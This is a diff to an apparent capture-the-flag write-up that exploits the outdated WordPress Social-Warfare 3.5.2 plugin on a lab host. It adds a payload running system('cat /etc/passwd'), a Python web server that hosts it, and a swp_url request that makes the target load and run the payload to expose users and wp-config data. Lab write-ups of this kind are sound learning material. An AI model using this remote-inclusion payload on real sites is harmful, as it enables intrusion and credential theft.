@@ -20,9 +20,26 @@ Port 22, and 80 are open
 ![image1](https://user-images.githubusercontent.com/66635295/158748297-d989c1f4-acdc-4e01-bef1-9e606e4ed10c.png)  
 **Scan reveals outdated plugin named Social-Warfare 3.5.2**  
 This Vulnerability allows commands to run for obtaining user Credentials  
-![image15](https://user-images.githubusercontent.com/66635295/158748468-74c92d41-881e-4414-9070-43a2bb30d4f1.png)
+![image15](https://user-images.githubusercontent.com/66635295/158748468-74c92d41-881e-4414-9070-43a2bb30d4f1.png)  
+**Payload File**  
+[<pre>system(‘cat /etc/passwd’)</pre>]  
+Shows passwd file contents  
+![image5](https://user-images.githubusercontent.com/66635295/158751852-ada62fb4-56f6-4e2f-ae20-68cd67dd5b81.png)
+
+**Python Simple server**  
+[python3 -m http.server 80]  
+![image14](https://user-images.githubusercontent.com/66635295/158752244-0f7a0d8f-8f83-41cd-b61b-d747a62290ce.png)
+
 
 
 
 **ENUMURATION**
 ---
+**Visit Website
+[http:// 192.168.55.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://localhost/payload.txt]    
+User Takis is revealed 
+![image10](https://user-images.githubusercontent.com/66635295/158752455-4b285dee-5cd6-4449-a4f3-9d179e54d6a2.png)  
+**Config.php**
+Word press config.php holds important info. The payload can be used to check for it  
+![image9](https://user-images.githubusercontent.com/66635295/158752587-5af73a09-806d-4ada-bb96-16bcc3e5bd9e.png)
+
